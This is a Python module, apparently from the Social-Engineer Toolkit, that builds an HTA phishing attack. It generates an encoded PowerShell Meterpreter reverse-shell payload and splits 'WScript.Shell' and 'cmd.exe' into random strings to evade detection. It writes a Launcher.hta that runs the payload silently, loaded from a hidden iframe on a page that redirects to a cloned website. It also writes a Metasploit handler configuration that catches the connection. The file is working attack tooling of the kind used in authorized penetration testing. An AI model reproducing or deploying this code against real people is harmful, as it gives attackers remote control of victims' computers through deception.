#!/usr/bin/env python
######################################################
#
# Main files for the HTA attack vector within SET
#
######################################################
from src.core.setcore import *

def gen_hta_cool_stuff():
    print_status("HTA Attack Vector selected. Enter your IP, Port, and Payload...")
    ipaddr = grab_ipaddress()
    update_options("IPADDR=%s" % (ipaddr))
    port = input("Enter the port for the reverse payload [443]: ")
    if port == "": port = "443"
    print("""Select the payload you want to deliver:\n\n  1. Meterpreter Reverse HTTPS\n  2. Meterpreter Reverse HTTP\n  3. Meterpreter Reverse TCP\n""")
    selection = input("Enter the payload number [1-3]: ")

    # define the payloads
    if selection == "":  selection = "1"
    if selection == "1": selection = "windows/meterpreter/reverse_https"
    if selection == "2": selection = "windows/meterpreter/reverse_http"
    if selection == "3": selection = "windows/meterpreter/reverse_tcp"

    # generate powershell code
    print_status("Generating powershell injection code and x86 downgrade attack...")
    ps = generate_powershell_alphanumeric_payload(selection, ipaddr, port, "x86")
    command = (powershell_encodedcommand(ps))

    # hta code here
    print_status("Embedding HTA attack vector and PowerShell injection...")

    # grab cloned website
    url = fetch_template()

    command = command.replace("'", "\\'")

    # generate random variable names for vba
    hta_rand = generate_random_string(10, 30)

    # split up so we arent calling shell command for cmd.exe
    shell_split1 = generate_random_string(10, 30)
    shell_split2 = generate_random_string(10, 30)
    shell_split3 = generate_random_string(10, 30)
    shell_split4 = generate_random_string(10, 30)
    shell_split5 = generate_random_string(10, 30)

    cmd_split1 = generate_random_string(10, 30)
    cmd_split2 = generate_random_string(10, 30)
    cmd_split3 = generate_random_string(10, 30)
    cmd_split4 = generate_random_string(10, 30)
    
    main1 = ("""<script>\n{0} = "WS";\n{1} = "crip";\n{2} = "t.Sh";\n{3} = "ell";\n{4} = ({0} + {1} + {2} + {3});\n{5}=new ActiveXObject({4});\n""".format(shell_split1, shell_split2, shell_split3, shell_split4, shell_split5, hta_rand, shell_split5))
    main2 = ("""{0} = "cm";\n{1} = "d.e";\n{2} = "xe";\n{3} = ({0} + {1} + {2});\n{4}.run('%windir%\\\\System32\\\\""".format(cmd_split1,cmd_split2,cmd_split3,cmd_split4,hta_rand))
    main3 = ("""' + {0} + """.format(cmd_split4))
    main4 = ("""' /c {0}', 0);window.close();\n</script>""".format(command))
    html_code = ("""<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\n<script type="text/javascript">setTimeout(function(){window.location.href="%s";}, 15000);</script>""" % url)

    # metasploit answer file here
    filewrite = open(userconfigpath + "meta_config", "w")
    filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n\n" % (selection, ipaddr, port))
    filewrite.close()

    #  write out main1 and main2
    filewrite = open(userconfigpath + "hta_index", "w")
    filewrite.write(html_code)
    filewrite.close()

    # write out launcher.hta
    filewrite = open(userconfigpath + "Launcher.hta", "w")
    filewrite.write(main1 + main2 + main3 + main4)
    filewrite.close()
